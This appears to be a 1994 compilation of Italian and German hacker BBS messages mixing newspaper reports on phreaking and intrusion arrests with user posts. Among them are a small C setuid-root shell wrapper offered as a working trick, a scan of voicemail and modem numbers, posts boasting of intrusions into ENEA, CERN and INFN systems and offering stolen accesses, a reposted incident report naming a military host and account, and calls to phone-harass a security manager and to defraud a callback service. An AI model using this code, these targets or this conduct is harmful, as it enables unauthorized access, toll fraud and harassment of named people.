 ! Origin: ECN BOLOGNA 59-45-260556 (45:1917/4)
SEEN-BY: 1/1 4/1 5/1 9/1 30/1 999/999 1000/1 4 1100/1 1200/1 5 1400/1
SEEN-BY: 1500/1 1600/1 1800/1 1917/1 2 3 4 5 6 9 11 2000/1


---------------------------------------

  Area: Dibattito CyberPunx 
  Msg#: 7277                                         Date: 29 Aug 94  22:08
  From: Ice Man                                      Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: RAgazzo arrestato per aver "giokato" kon il 113
*****************************************************************************
Dalla stampa di Lunedi 28 Agosto:

>Catania,per 5 giorni un sedicenne ha fatto impazzire i centralini delle forze 
>                                                                [dell'ordine
>                M A N D A    I N    T I L T    I L    1 1 3
>           
>           Polizzia beffata da un piccolo genio dell' elettronica

...Vi faccio un sunto di cosa e' successo:

   "...E'bastato avere il Sirio normale apparekkio telefonico della SIP
       e il servizio di conversazione a tre...
    ...Il ragazzino terribile prima componeva il numero di una sala operativa
       e poi kuello dell' altra..."
... Direi normale amministrazione di Phreking a parteil fatto ke il "Piccolo   
... genio" si sia fatto bekkare e kuesto non vorrei dare giudizi ma non mi 
... sembra proprio una kosa furba,
... Dico se lui e'un genio gente ke BoXa da anni e usa dial-Out kome si 
... dovrebbe sentire??? kome dio sceso in terra!?!?!
... Ma il bello viene adesso:
    "...La polizia ha impiegato una settimana e sofistikate apparekkiature
        per le intercettazioni telefonike per venire a capo dello strano 
        giallo. Poi individuata una fascia di utenza sospetta c'e' stata
        una vera e propri irruzione in kasa del responsabile..."
... Ok da kui si dedukono un paio di kosette:
... 1) ke la pula ci mette 1 settimana per tracciare kon certezza una 
...    telefonata e la kosa mi sembra esagerata figuriamoci un iterurbana o 
...    una telefonata ke passa da una rete!!!!!!
... 2) Individuata "la Fascia di utenza" il ke vuol dire ke se il tipo 
...    smetteva un giorno prima non lo avrebbero tracciato mai piu...
... Kuesto e tutto ma si passa da un eccesso all'altro dopo lo skandalo 
... kotrozzi kuesto Lama kui!!!
... Non dovrei dirlo xke' sono l'ultima persona a poterlo fare ma diko e ke 
... diamine!!!!! a me sto kui mi pare proprio lama Voi ke mi dite????


... Cosa ci aspetta alle porte del 2000????? Il campanello    
-!- Blue Wave/RA v2.12 [NR]
 ! Origin: ---> ECN_TO +39-11-6507540 <--- (45:1917/2.0)
SEEN-BY: 1/1 5/1 9/1 10/2 1000/1 4 1100/1 1200/1 2 5 6 7 1400/1 1500/3
SEEN-BY: 1600/1 1800/1 1900/1 1917/1 2 3 11 2000/1

---------------------------------------

Mitt XXXXXX 
Data 16/03/94 17:24:31 
Msg_XXXX 1/1  Object: semplice ma funzia...

main(argc, argv)
int argc;
char *argv<>;

<
setuid(0);
setgid(0);      
argv<0> = "/bin/sh";
execvp(argv<0>, &argv<0>);
perror("exec()"); 
>

---------------------------------------

  Msg#: 5265                                         Date: 16 Jul 94  10:52
  From: Mastro Ciliegia                              Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: ancora orrorismo a BO

da "La Repubblica - Bologna", 15/7/94


Il macabro in strada -
COSI' COLPISCE L'ORRORISTA
E con Baggio-gol esce frattaglia selvaggia -
L'altra notte l'ultimo scherzo-performance alla Villa
delle Rose. E poi quel cuore ai giardini Margherita... -

di STEFANO CASI

FRATTAGLIA selvaggia: il giochino dell'estate. Ci si procurano interiora  ani-
mali dal macellaio, si abbandonano in un angolo della citta' accanto a scritte 
misteriose,  e ci si nasconde "per vedere di nascosto l'effetto che fa",  come 
direbbe Enzo Jannacci. Cosi' fanno gli "orroristi", i terroristi dell'horror.

Scherzi macabri o capolavori artistici? Il dubbio e' legittimo, ma il disgusto 
rimane immutato. Ne sanno qualcosa i frequentatori dei Giardini Margherita che 
hanno  trovato resti animali accompagnati dal misterioso  slogan  "Novosibirsk 
brucia".  Il reperto dei Giardini margherita e' stato portato  all'isituto  di 
medicina legale, dove il dottor Romanelli sta stilando il suo referto: "E'  un 
cuore animale, forse di maiale - ci spiega -, tutto avvolto da un filo di  ny-
lon. E' sicuramente uno scherzo".

Uno scherzo che pero' potrebbe rivelarsi pericoloso. All'ufficio controllo del 
territorio ammettono di essere stati presi un po' in contropiede dallo  strano 
episodio:  "Stiamo  aspettando il referto del medico legale e  poi  valuteremo 
quali reati saranno stati commessi". Procurato allarme? Collocamento pericolo-
so di cose che "possano offendere o imbrattare o molestare persone", come  re-
cita il codice penale? Vedremo.

Intanto il dibattito sull'identita' dei misteriosi buontemponi si allarga e si 
complica.  Soprattutto per la presenza sempre piu' massiccia di  frattaglie  e 
resti  animali negli eventi artistici di questi ultimi anni. Anzi,  di  questi 
ultimi  mesi. Alla fine  di maggio, per esempio, Riccardo Paccosi si  esib  in 
una  performance politico-splatter in mezzo a via Indipendenza, in cui  faceva 
fuoriuscire  viscere animali dalla giacca. Mentre nella provincia  reggiana  i 
Pericolo  Giallo fanno azioni di strada ironicamente  "cruente":  nell'ultima, 
per esempio, un Babbo  Natale frustato da una "fatalona", viene sbudellato con 
grande  spargimento di intestini e fegatelli. "Il nostro lavoro e'  legato  al 
discorso politico fra esteriorita' e interiorita'", psiega Fausto Franchi, ri-
chiamandosi a esperienze artistiche come Fluxus, Nitsch e la Body-art. proprio 
mentre l'Italia batteva la Bulgaria sul campo del Giants' Stadium, i  Pericolo 
Giallo  hanno riproposto la loro performance natalizio-viscerale nel  giardino 
di Villa delle Rose all'interno della programmazione di "Bologna sogna",  l'e-
state  bolognese a cura dell'Assesorato alla cultura. Una curiosa  coincidenza 
con  la frattaglio-mania che attanaglia la citta' in questi giorni, e  che  ha 
ricordato  il "giallo" - piu' simpatico, a dire la verita' - di alcune  estati 
fa,  quando sui muri bolognesi apparve il disegno infantile di  un'ochetta  in 
corsa. Quel disegno era in realta' l'intervento estetico di una coppia assurta 
poi  agli onori della cronaca artistica in mostre di prestigio: Cuoghi e  Cor-
sello.

La  mania  delle frattaglie, nel frattempo, ha mosso altri buontemponi  a  uno 
strano  tipo di imitazione. Anziche' "agire", come fanno Paccosi e i  Pericolo 
Giallo, preferiscono scrivere di scherzi macabri inesistenti. Sperando di  en-
trare a far parte di una  leggenda metropolitana che, tuttavia, ha inquietanti 
riscontri con la cronaca. 

Come funziona? Semplice: basta raccontare uno scherzo, recuperandolo dalla me-
moria  di fan non cresciuto di horror-manga o splatter-fanzine, e si  psedisce 
il  messaggio. Per via telematica, creando scompiglio nelle reti di  comunica-
zione. Oppure per posta, naturalmente non scrivendo il proprio nome, ma quello 
di  un altro (meglio se di persona defunta), oppure usando la carta  intestata 
di  una ditta ignara, come e' successo con una azienda tessile alle  porte  di 
San  Lazzaro che, trovatasi ieri in questa imbarazzante situazione,  sprogera' 
denuncia contro ignoti.

-!-
 ! Origin: European Counter Network - Milano - 39-2-2840243 (45:1917/1)
SEEN-BY: 1/1 4/1 5/1 9/1 10/2 30/1 999/999 1000/1 4 1100/1 1200/1 5 1400/1
SEEN-BY: 1500/1 1600/1 1800/1 1900/1 1917/1 2 3 11 2000/1

---------------------------------------

Mitt XXXXXXXXX      
Data 22/06/94 16:33:44 

ALLORA DICEVO AVEVO TELEFONATO IN CC AD UNA PERSONA MENTRE STAVO PARLANDO 
MI SI STACCA LA SPINA DALLA PROLUNGA RIAGANCIO SUBITO LA SPINA ALZO IL 
TELEFONO E MI DA LIBERO O OCCUPATO NON CI HO FATTO MOLTO CASO RIATTACO PER 
RICHIAMARE LA PERSONA E IN QUEL MOMENTO IL TELEFONO MI SQUILLA E MI RITROVO 
IN LINEA QUELLA PERSONA CHE NON AVEVA FATTO ALTRO CHE RESTARE IN LINEA PERCHE 
NON MI AVEVA PIU SENTITO PRATICAMENTE LA CONVERSAZIONE SI E' RIATTIVATA DA 
SOLA AH UN ALTRA COSA A ME OGNI TANTO MI ARRIVANO DEGLI SQUILLI E NON 
RISPONDE NESSUNO MA IL FATTO STRANO E CHE SE STO COLLEGATO MI FA CADERE 
COME SE FOSSE UN 197 SUCEDDE SOLO A ME O ANCHE ALTRE PERONE RICEVONO STRANI 
SQUILLI DURANTE IL GG?

---------------------------------------

Msgr. Arkimede
Area Lo Sfogatoio
Mitt SYSADM
Data 17/07/94 10:02:11
Msg_792  Object: gli  amici telematici

	  Che simpatici gli amici telematici, specialmente quando si 
tratta di dialogare tramite CPE. Succede, a volte, che un utente lascia 
una Cpe ad un'altro utente, dove gli chiede una qualsiasi cosa. Dopo una 
settimana il destinatario di quella cpe risponde con un messaggio che fa 
quasi paura: contiene un miserabile e magro   "NO". 

Il mittente del primo messaggio, legge quel messaggio e si rende conto che 
tra le sue capacita' umane manca quella di saper abbinare quella vaga 
risposta ad un suo precedente messaggio. In quel momento succede di tutto, 
litiga con la madre, manda a quel paese il fratello e non telefona neppure 
alla ragazza.   

Momenti di estrema confuzione lo tormentano: "a che messaggio, a che 
argomento sara' abbinato quel bruttissimo no?", pensa il povero utente, 
che, tutto sudato, cerca tra la polvere del suo cervello ma senza darsi 
una risposta.              

La faccenda si conclude, tagliando il copione, con un ulteriore messaggio 
di Mr. Sillabe, il quale, sorpreso di non averla ricevuta prima, sollecita 
una risposta al suo tenebroso messaggio. Il povero utente ormai distrutto 
dalla situazione puo' decidere, tra le seguenti, una soluzione:

1) Mandare un'altro messaggio in cpe a quell'utente, pregandolo di 
   ricondurlo sull'argomento dimenticato, con la probabilita' di ricascare 
   nel tenebroso giro e di riperdere la testa.                               
2) Far finta di nulla, e fregarsene come faccio Io... scrivendo in Sfogatoio 
   quando il problema raggiunge un numero preoccupante di casi.              
3) Scrivere all'utente, pregandolo di non farsi piu' vivo nell propria cpe, 
   accusandolo pesantemente di aver provocato gravi danni al ns. equilibrio 
   mentale e di aver fatto dimenticare la parola pace nella propria famiglia.
4) Mandare una risposta a caso, magari con qualche frase ironica, ma del 
   tutto insignificante, prendendo esempio da Etrusco.                       
5) Contattare il SYSOP e fare escludere, trviare completamente l'utente dalla
   messaggeria.                                                              

Morale della favola: ci vuole un po' di chiarezza nella CPE. Se io mando un 
messaggio ad un utente con una domanda che esige anche soltanto un "Si" o 
un "No", la relativa risposta deve contenere un mininimo di richiamo all'
argomento  del messaggio a cui si risponde. 
La cpe non e' una casella riservata al dialogo tra    DUE persone, ma al 
dialogo con PIU' persone, quindi questa routine va eseguita   SEMPRE.        
Se farlo vi stanca enormemente, bevete un po' di Enervit o Gatorade o fatevi 
una macro!                                                                   

---------------------------------------


  Msg#: 5266                                         Date: 16 Jul 94  10:53
  From: Mastro Ciliegia                              Read: Yes    Replied: No 
    To: All                                          Mark:                     
  Subj: arte e orrorism

Trafiletto allegato all'articolo "COsi' colpisce l'orrorista":

NOSTRI ATTORI DEI MACELLI
Arte o pessimo gusto? Il critico Barilli vuol scoprire le strategie. Ci sono
precedenti.

E SE FOSSE veramente arte? "E' ancora prematuro parlarne", risponde Renato Ba-
rilli,  attento  studioso delle nuove tendenze artistiche. "Per il  momento  - 
prsegue - sembrerebbero solo scherzi di pessimo gusto, senza niente di esteti-
co ne' di anti-estetico. 

Ma dobbiamo attendere per capire se i ritrovamenti di frattaglie sono  casuali  
o rispondono a una strategia". Quel che e' certo e' che Bologna e l'Emilia Ro-
magna  sono  tradizionalmente al centro di eventi artistici che  comportano  - 
letteralmente  - spargimento di sangue e interiora. Proprio grazie a  Barilli, 
infatti, si consumo' a Bologna, in Santa Lucia, nel giugno 1977, uno degli  e-
venti  piu' importanti della body-art degli anni settanta,  all'interno  della 
celebre "Settimana della performance" organizzata dalla Galleria d'arte moder-
na. L'artista era Herman Nitsch, che rovescio' sui corpi nudi di alcuni volon-
tari  quintali di sangue e budella animali. Un evento-choc che fece  conoscere 
un'intera area geografico-artistica di cui venne data una documentazione  "in-
quietante" in una mostra sull'arte austriaca a Bologna pochi anni fa. Anche in 
ambito teatrale sono emerse tensioni in questo senso, a cominciare dal contro-
verso spettacolo, ambientato in un macello durante l'uccisione di un  cavallo, 
realizzato dai Magazzini Criminali al festival di Santarcangelo di dieci  anni 
fa.  per continuare con le opere della cesenate Societas Raffaello Sanzio,  il 
cui  ultimo spettacolo, "Lucifero", porta in scena quarti di bue  appesi  agli 
uncini e teste mozzate di agnelli.

-!-
 ! Origin: European Counter Network - Milano - 39-2-2840243 (45:1917/1)
SEEN-BY: 1/1 4/1 5/1 9/1 10/2 30/1 999/999 1000/1 4 1100/1 1200/1 5 1400/1
SEEN-BY: 1500/1 1600/1 1800/1 1900/1 1917/1 2 3 11 2000/1


---------------------------------------

Mitt. Piergiorgio

'Il Cretino' (ANSA)                                                     

BO  EMILIA  ROMAGNA NORD ITALIA EUROPA TIT SCOPERTO INTRUSO IN RETE TELEMATICA  
MONDIALE  IND CRONACA TXT ZCZC0330/RMB R  CRO S0B S41 QBXJ SCOPERTO INTRUSO IN 
RETE   TELEMATICA   MONDIALE  (ANSA)  -                                         

BOLOGNA,  26  MAG  -  Era  riuscito  ad inserirsi nella principale 
''autostrada elettronica''      (definizione     del presidente  Usa  
Clinton), la Internet, fondata  dal Pentagono nel '60, rivolta 
prevalentemente       alla      ricerca scientifica   e   accademica,   
e   ora collegata  a 15 milioni di computer nel   mondo,  di  cui  
20.000 in Italia.  Uno dei  primi ''intrusori'' italiani (all' estero  
sono  accaduti diversi casi) e' stato  identificato  da un pool guidato 
dal  sostituto  procuratore  di Bologna Riccardo  Rossi  e  che comprendeva 
gli investigatori  dei  carabinieri  e  gli esperti  del  Politecnico  di  
Milano e dell'  Universita'  di  Parma.   E' una ''matricola''    della    
Facolta'   di informatica della Statale di Milano, di cui   non   sono   
state   fornite   le generalita'  ne'  dal  magistrato,  ne' dall'  
Universita'  di  Bologna, che ha diffuso  un  comunicato.   L'  illecita 
intrusione   nella  superprotetta  rete elettronica    (che   consente   
lavori integrati    di    elaborazione    dati altrimenti    impensabili)   
e'   stata ravvisata  quasi  subito,  ai  primi di aprile,  dal Dipartimento 
di Matematica di Bologna (il primo a connettersi alla rete  nell' 87) e 
dal Cirfid (centro di ricerca  in  filosofia  del  diritto  e informatica   
giuridica),   sempre  nel capoluogo  emiliano.   Il Rettore dell' Ateneo,   
Fabio   Roversi   Monaco,  ha presentato denuncia il 14 aprile e gia' il  
1  maggio era stato identificato il dell' intrusore:  da quel momento
sono    scattate   le   intercettazioni telefoniche  sulla  sua utenza.  
Queste hanno  accertato  gli  inserimenti  via ''modem''  e le 
conversazioni con altri ''informaticofili''  in  cui dava conto di   
aver   scoperto  la  password  per entrare   nel   sistema.   Ora  rischia 
cinque  anni  di  carcere per ''accesso abusivo'' e fino a un anno e 10 
milioni di  multa per la diffusione a terzi del codice   di   accesso.   
Convocato  dai carabinieri  di  Bologna,  ha  detto di essersi  molto  
''annoiato,  perche'  i programmi  erano  tutti  uguali''.   Ma intanto  
aveva  scoperto  il  70% delle parole  d'  ordine degli utenti Cirfid, 
in  meno di un mese di lavoro o, forse, di  gioco.  L' intrusore infatti 
non ha fatto  danni (avrebbe potuto cancellare o correggere interi file) 
e forse si e' impadronito solo per caso del codice di un utente regolare 
per poi qualificarsi come ''Root'', che e' il nome effettivo dell'  
amministratore  del sistema, con il  quale  ha cercato di scardinare un' 
altra  trentina  di sistemi informatici italiani.     Ma    gli   
investigatori ritengono  che possa esserci lo zampino del   movimento   
degli   Hackers,  che combatte    come   antidemocratica   la 
concentrazione    di    dati   politici economici   e   militari   e   
tende  a scardinare   i   sistemi   per  rendere pubbliche  le  
informazioni.  In Italia gli  Hackers,  secondo  quanto riferito in  
una  conferenza stampa, si          riconoscerebbero  in una rivista, 
punto di     riferimento    dei    ''pirati'' elettronici italiani.  
(ANSA).          

Spero serva di lezione....                                                                                                                                                                                                                      

---------------------------------------

Mitt XXXXXXXXXX
Data 25/01/94 10:35:32 
Msg_XXX  1/1  Object: NVI SKAN

Questo e' lo scan del segmento 1678745xx
500 VMBX                                
507 VMBX                                
509 VMBX                                
518 ? 4 DIGIT PROGRAM                   
534-535 VMBX                            
537 VMBX                                
541 MODEM 9600                          
542 VMBX                                
550 MODEM 2400                          
551 VMBX                                
555 MODEM 9600                          
556 VMBX                                
585 VMBX

---------------------------------------


Mitt Piergiorgio
Data 02/01/94 13:10:20 
Msg_XXX  Object: ANSA...volevate sapere di Marz 

93012105150  DOCUMENT=       1 OF        4  NUMBER OF LINES =     69             
DATRAS   = 930121                       
SCELTA   =                             GEN       
IDENTIFICAZIONE__ 930121 05150                                                                     
21 GEN 1993                                        LUO       ROMA                                    
RM   LAZIO CENTRO ITALIA EUROPA                                       
TIT       ''INTRUSI NEL COMPUTER'': COME AGISCONO GLI HACKER                    
IND CRONACA   TXT       ZCZC394/0B
U CRO S0B R16 QBXB                      
''INTRUSI NEL COMPUTER'': COME AGISCONO GLI HACKER                                 

(ANSA) - ROMA, 21 GEN - Veri e propri pirati dell'                           
informatica, gli hacker sono specializzati nel violare la                       
sicurezza di computer e programmi per penetrare al loro interno,                
impadronendosi dei dati o danneggiandoli (vedi Ansa 073/0B e                    
segg). I loro obiettivi sono banche dati, informazioni riservate                
di aziende ed enti pubblici o privati. A volte si impadroniscono                
direttamente delle informazioni, in altri casi si limitano a                    
scoprire i codici segreti per entrare nei computer per venderli                 
o scambiarli. Questi codici sono in realta' le informazioni piu'                 
preziose perche' non sono soltanto la chiave per violare la                    
''privacy'' del computer, ma la porta per accedere alla rete                    
informatica alla quale sono collegati i computer e iniziare un                  
viaggio telematico, potenzialmente in tutto il mondo, a spese                   
delle aziende danneggiate.              

In Italia gli hacker sono attivi da anni, tanto da essere fra                
i piu' abili del mondo, ma scoprirli e' difficilissimo. Finora                  
il caso piu' eclatante e' stato, due anni fa, la truffa ai danni                
del servizio Videotel della Sip. Con l'operazione portata a                     
termine oggi dalla Criminalpol a Roma, Milano e Napoli  la vita                 
dei pirati informatici diventa invece piu' difficile. I circa 40                
hacker inquisiti sono stati ''pedinati via cavo'' giorno e notte                
per tre mesi, grazie a un sistema unico in Europa messo a punto                 
dall'Ufficio della Criminalpol per i crimini informatici.                       

Dopo avere individuato il primo hacker, quello che ha                           
disattivato la banca dati sui trapianti del Policlinico 
di Roma, la Criminalpol ha preferito non                        
bloccarlo subito, ma seguirlo lungo le reti informatiche per                    
risalire ai suoi ''colleghi''. E' riuscita a farlo dando                        
all'hacker l'illusione di penetrare nella banca dati del                        
Policlinico, mentre veniva indirizzato dalla polizia in una                     
copia del sistema. In questo modo l'hacker continuava ad agire                  
senza fare danni, mentre la polizia ne seguiva le mosse in un                   
computer gemello di quello usato dall'hacker, collegato alla                    
rete telefonica, che sul terminale della polizia mostrava tutte                 
le operazioni del computer pirata. ''Solo un metodo cosi'                       
sofisticato poteva smascherare hacker tanto abili'', ha                         
commentato il direttore centrale dell'Istituto per la sicurezza                 
informatica (Istinform), Fulvio Berghella, che ha collaborato                   
con la Criminalpol. ''Sono stati molto furbi - ha aggiunto -                    
perche' riuscivano a penetrare indisturbati nei computer                        
'mascherandosi' in modo da sfuggire ad ogni controllo''. Piu'                   
abili del protagonista del film ''Wargame'', gli hacker                         
viaggiavano sulle reti informatiche di tutto il mondo,                          
dall'Estremo Oriente al Nord America, usando programmi in grado                 
di ''mimetizzarsi'' con il sistema dei computer nei quali                       
penetravano, tanto da diventare praticamente invisibili ai                      
controlli. (ANSA).                                                                 

---------------------------------------

Mitt XXX
Data 22/07/94 16:01:01
Msg_XXXX Object: non esageriamo

le cazzate via e-mail si scrivono ovunque, ma li dentro gente con le 
palle c'e' eccome... tramite i tanti dell'enea e' possibile accedere 
direttamente al cern e pare all'acceleratore di particelle in remoto, 
se e' vero che sono tutti collegati sarebbe un bel colpo avere accesso 
a tutti i sincrotroni della terra, fino a poco tempo fa mezzo pianeta 
aveva accesso ai vax del cern ma pare nessuno sia riuscito a cavarne 
nulla, in giro ho anche letto che sta per partire una spedizione in 
antartide (enea) ed e' stato creato un network custom per tenere i
contatti.. il net e' collegato a inet via SAT       
ho gia' tutte le info.. per ora i collegamenti sono instabili ma presto 
sara' ok(o forse lo e' gia').. sara' il amssimo hackerare la.. di cose 
da farece ne sono parecchie, peccatoche la maggior partedella gente 
pensa che l'hacking sia la ricerca dinuovi pad X fare i fighi su qsd.. 
ah la diffusione di E-mail privata e' un reato motlo serio, spiegatemi 
ildivertimento a leggere i messy privati di una coppia.. e come mettersi 
a spiare uan ragazza che si spoglia con ilbinocolo.... penoso                                                                                                                 

Area XXX
Mitt XXXXX/XX
Data 23/07/94 01:55:51
Msg_XXXX 1/3  Object:enea                           
ke vuoi accessi x l'enea?               
kuanti?                                 
ripeto, x me all'enea sono TUTTI degli emeriti koglioni, l;trimenti mi 
avrebbero gia bekkato da 3 anni e invece sto sempre li'? kuindi di cert 
furbi non lo sono.

poi ke facciano i links del kazzo ke vogliono, non me ne fotte nulla, 
io sfondo x sfodare una societa e basta, non me ne frega un kazzo delle 
particelle di biotomi dell'uccello dell'operatore.        

Non ti diverti a kallare ksd dal botswana te? pekkato io si. senno si 
skannan sempre gli stessi paesi le stesse societa'
e ci si rompe proprio il kazzo kredimi.
					
il cern via decnet e' ovviamente linkato all'enea xke anke l'enea sta in 
decnet globale, non tutto ma molti vax si.     

komunkue il cern e' linkato a tutto, non e' il kaso di usare gli accounst 
dei lamers ke giravano sul cern e ke girano da sempre x avere accesso ai 
diski del cern stesso.                               

I links piu grandi kon l'italia, a kaunto ho visto, il cern li ha kon 
l'Infn, altri granmdissimi koglioni.              

Una kosa: nessuno skannando x.25/inet/decnet ha mai bekkato il vax di 
kontrollo del gran sasso? cioe...                
di un koso (non rikorod kosa) ke han messo sotto o dentreo il gran sasso, 
un vax 4000 mi pare..  xke io ho un account full privs la, ma mi son xso 
l'indir decnet e inet, kuello x.25 ce l'ho xo' e in Na al momento.    
grazie

Mitt Xxx
Data 23/07/94 14:44:34
Msg_XXXX 1/1  Object: ENEA

li stimo e continuero'  a stimarli per quello che fanno, io non sono 
maistato buttato fuori da niente se e' per questo ma non e' perche' 
glioperatorisono coglioni, semplicemente minascondo bene..     
infn confermo, addirittura su un sunos mi sono cuccato il filesistem 
montato in remoto diun server del cern, robetta da iente comunque.. 
il net del gran sasso e' infn, ti ricordi il nome del vax? ildomain 
e' gs.infn.it  a memoria, ci sono entrato ultimamente X il cisco, 
sofndabile ma niente x.25. se entri non cancellarmi i log

---------------------------------------

 Corriere della Sera                                    03 Agosto 1994

 ---------------------------------------------------------------------------
 Denunciati 5 giovani: Hanno fatto pagare salate bollette Sip a una societa'
 di comunicazioni
	   I PIRATI TRADITI DA SAMANTHA
 Il collegamento con la linea erotica smaschera i truffatori col computer
 --------------------------------------------------------------------------
						     A cura di   Ice MC

 Da quasi un anno la bolletta Sip per i collegamenti via computer sembrava
 impazzita. c'erano delle spese per i servizi erotici di Samantha, una di
 quelle messagerie su cui gli appassionati si scatenano con le fantasie piu'
 turpi. Poi sono arrivati i costi per la consultazione delle banche dati di
 anziende aerospaziali e uffici federali americani. Dalla corte di cassazione
 di roma, e le cifre astronomiche per i collegamenti con la rete telefonica
 cinese.
 Tutto questo era a capo di una societa' specializzata in telecomnucazioni.
 Per un po' la ditta ha pagato: fino a 150 milioni a bimestre. Ma tre mesi
 fa i manager si sono decisi a presentare una denuncia alla Digos ed e'
 comincita la prima indagine computerizzata mai messa a segno a Milano.
 Gli investigatori non hanno fatto pedinamenti, ma hanno trascorso intere
 settimane al loro computer per intercettare le connessioni illegali. Alla
 fine cinque giovani pirati informatici sono stati denunciati per frode
 informatica: due reati entrati a far parte del codice penale soltanto 
 l'anno scorso.
 Dei cinque, tre sono di Milano: Fabio P., 25 anni, autista di camion con
 la grande passione per i computer, Maurizio O., 21, studente di Scienze
 politiche, Luca R., 22, anche lui studente universitario. Gli altri due
 invece sono Massimiliano L., 25 anni, tecnico in un'azienda a Roma dove
 abita, e Andrea S., 17 anni, studente, di Siracusa.
 I cinque non si conoscevano. Da una banca dati pirata avevano saputo il
 codcie segreto della societa' di telecommunicazioni milanese che, per le
 sue necessita' di lavoro, era collegata al servizio Itapac, la rete
 informatica della Sip. Il codice segreto e' il numero di identificazione
 con cui la Sip riconosce l'abbonato e gli addebita gli scatti. E proprio
 avendo quel numero, con le loro tastiere, i cinque pirati si sono inseriti
 nella rete Itapac. Per due mesi gli agenti, diretti dal vicequestore Dino
 Finolli, hanno seguito sui loo video le loro scorribande informatiche:
 un lavoro simile alle intercettazioni telefoniche. I tre ragazzi di Milano
 e il collega di Siracusa sono stati subito irintracciati, perche' 
 utilizzavano la linea telefonica di casa. Piu' difficile invece risalire
 al tecnico di Roma, che si serviva del computer dell'azienda dove lavora.
 I poliziotti dovevano identificarlo tra decine di dipendenti. Ma non hanno
 fatto fatica: Massimiliano L. si collegava quasi sempre alla messageria 
 erotica di Samantha. Una ragazza della Digos lo ha convinto, via computer,
 a rivelare il numero di telefono promettendogli qualcosa di vermente sexi.
 Gli investigatori hanno cosi' rintracciato l'azienda. E verso le 11
 dell'altra mattina una squadra, inviata a Roma, lo ha sorpreso con il
 computer ancora acceso.
						      Fabrizio Gatti

 [N.d.R.: Allora.. come al solito la Digos fa' cilecca.. o per lo meno..
    becca solo i + Lame..hehe ... 
	  In sostanza.. volete fare sesso al vdt?.. beh..fatevi dare il suo 
      di numero..  =:-P                Ice MC ]

 [N.d.R.: Voci di corridoio parlano di altri 20 fermi nella zona di Milano
	  ma prendetela colle pinze, potrebbero essere solo stronzate. Del
	  resto l'avete letto alcune "stronzate" piu' sopra :) 

          Sul prossimo numero di TBP intervisteremo, se ci riuscira' di
          contattarli, i diretti interessati :O ]

---------------------------------------
SOMETHING FROM SECTEC BBS
-------------------------

Msg #1018  Wednesday, June 22, 1994 03:15 CET  
From: Nexus.6%bbs@sectec.greenie.muc.de (Nexus 6)
To: All%bbs@sectec.greenie.muc.de (All)
Subject: lamers!

I left mesages on this bbs about a system, a military systen and here
it is  from cert ... so there is someone here that is really a lamer
and he works for CERT so keep your eyes reallo open! here you are the
txt
 
From bin Mon Jun 13 01:38 EDT 1994Received: from tymix.tymnet.com by
hp.hq.dla.mil (16.6/1.34)        id AA02086; Mon, 13 Jun 94 01:38:50
-0400Received: by tymix.Tymnet.COM (4.1/SMI-4.1)        id AA25206;
Sun, 12 Jun 94 22:40:48 PDTReceived: from druid        by
tymix.Tymnet.COM (in.smtpd); 12 Jun 94 22:40:48 PDTReceived: by
druid.Tymnet.COM (4.1/SMI-4.1)        id AA25144; Sun, 12 Jun 94
22:39:32 PDTDate: Sun, 12 Jun 94 22:39:32 PDTFrom: ddrew@Tymnet.COM
(Dale Drew)Message-Id: <9406130539.AA25144@druid.Tymnet.COM>To:
cert@cert.org, ddrew@Tymnet.COM, nsd@druid.Tymnet.COM,       
postmaster@hp.hq.dla.mil, root@hp.hq.dla.milSubject: Possible
IncidentTo whom it may concern:My name is Dale Drew, and I am the
manager of the Data Systems Security Department here at MCI.During a
recent data investigation, our department identified a computermessage
left on a Bulletin Board System, left by a computer "hacker".The
computer hacker left a message to all members of the BBS that
includedan account name and password that could apparently be used to
access your computer system.  The hacker also indicates that he has
access to other accounts to other systems at your site, but did not
provide additionaldetails to the extent of that apparent access.The
system IP number is: 131.62.0.2, and the account name is "fho0337". 
Apassword was left as well, but I will not transmitt it over e-mail,
nor theactual BBS message itself, unless otherwise permitted by your
site to do so.We do not know the validity of the BBS message, I am
merely passing it alongas an FYI.  Additional information about this
incident can be obtained bycontacting me directly.  Information about
the poster of the message is alsoavailable.Best regards,               

      "SUCCESS THROUGH TEAMWORK"
=========================================================================
Dale Drew                                          MCI
Telecommunications Manager                                           
Data Systems Integrity Voice: (408) 922-6526                         
Internet: ddrew@Tymnet.COM Fax  : (408) 922-8870                       
  MCIMAIL: Dale_Drew/644-3335  # 

Msg #1025  Friday, June 24, 1994 11:46 CET  
From: The.Aky%bbs@sectec.greenie.muc.de (The Aky)
Subject: Re: lamers!

>so should we keep our H/P-info by ourselves? If some asshole is really
doing
>that shit above, he could get our ass' burned....
 
hmmm.. or he could get HIS ass burned.. hmm look this
>> Data Systems Integrity Voice: (408) 922-6526                        
>> Internet: ddrew@Tymnet.COM Fax  : (408) 922-8870                    
  
>>   MCIMAIL: Dale_Drew/644-3335  # 

call these numbers :P

Msg #1035  Monday, July  4, 1994 01:28 CET  
From: Ceasar.Thecat%bbs@sectec.greenie.muc.de (Ceasar Thecat)
To: All%bbs@sectec.greenie.muc.de (All)
Subject: WHY PAY FULL PRICE FOR A LONG DISTANCE CALL FROM EUROPE ?

If you have to call home or business in US, Canada or any other country
(outside EC) stop paying the full price. From now on you can benefit of
the US cheap prices with the Call-back service. You just have to call  
their computer in Houston (this is free), it calls you back and gives 
you a dial tone. This works for voice as well as for faxes and modem
communications. NO MINIMUM, you pay for what you really use NO ENTRY
FEES, they set the service frely for you.
MONTHLY DETAILED BILL in US dollars, pay with your credit card
possible destinations list and detailed prices available on request
contact Nicolas Laurance (33-1) 40.61.03.51
---
Hey do you smell what I am smelling? he.. Equip yourself with an
Omega.exe
and  go and break that shit. It is tool-free from Europe . America
online universal tool free number, should be breakable. Call the guy
and find the number.
Ceasar


Msg #201  Saturday, June 25, 1994 09:19 CET  
From: Dark.Side%bbs@sectec.greenie.muc.de (Dark Side)
To: All%bbs@sectec.greenie.muc.de (All)
Subject: inet sites

hello...
 
dunno if it was asked, but here are some interesting sites... (ftp)
uranus.ifi.unit.no/pub/Version_1.6_prerel_1/Demo_filer/
192.31.181.1 
128.184.1.1 /UniOn-students/incoming/"  "
 
most are pc/amiga/mac/etc...
check me if you need more... 
post others if you got them!


Subject: Re: IRC

some irc servers:

irc.mit.edu
polaris.ctr.columbia.edu
csz.bu.edu
irc-2.mit.edu

and a buncha others.

Msg #210  Thursday, July  7, 1994 02:13 CET  
From: The.Aky%bbs@sectec.greenie.muc.de (The Aky)
Subject: Re: IRC

yeah... 

